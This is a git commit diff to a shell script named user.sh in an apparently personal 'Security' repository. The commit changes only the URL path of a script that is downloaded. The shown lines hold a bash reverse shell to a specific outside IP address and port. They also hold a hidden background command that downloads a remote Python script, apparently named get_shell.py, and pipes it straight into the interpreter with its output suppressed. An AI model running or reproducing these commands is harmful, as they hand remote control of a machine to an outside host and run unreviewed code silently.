b87d5db5da2c471f1b578f10d36deff8f5193004
SuperLandy <44797172+SuperLandy@users.noreply.github.com>
2020-06-28 12:12:34 +0800

    Update user.sh

--- Security/shell/user.sh
+++ Security/shell/user.sh
@@ -1,2 +1,2 @@
 bash -i>& /dev/tcp/139.9.4.127/9996 0>&1
-nohup curl -fsSL https://raw.githubusercontent.com/SuperLandy/Python/master/Security/get_shell.py | python  1>/dev/null 2>/dev/null &
+nohup curl -fsSL https://raw.githubusercontent.com/SuperLandy/Python/master/Security/shell/get_shell.py | python  1>/dev/null 2>/dev/null &
